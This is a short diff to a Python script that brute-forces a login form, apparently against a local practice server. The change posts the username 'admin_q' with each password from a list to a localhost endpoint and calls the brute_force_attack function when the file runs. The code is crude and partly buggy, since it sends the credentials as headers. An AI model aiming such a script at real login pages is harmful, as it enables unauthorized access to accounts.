@@ -3,13 +3,20 @@ from time import time
 import requests
 
 
-HOST_URL = ""
+HOST_URL = "http://127.0.0.1:8000/login/new"
 def send_password(password_list:list):
     for i in password_list:
         try:
-          url = "http://localhost:8000/"
-          payload = {"password":str(i)}
-          response = requests.post(url,headers=payload)
+          '''
+          please change the code here to send request
+          '''
+          payload = {
+            "username": "admin_q",
+            "password":str(i)
+            }
+          
+          #response = requests.post(HOST_URL,headers=payload)
+          response = requests.post(HOST_URL,headers=payload)
           response.raise_for_status()  # Raise an exception for unsuccessful requests
 
           # Access data if successful
@@ -56,3 +63,4 @@ def brute_force_attack():
     
   return password
   
+brute_force_attack()
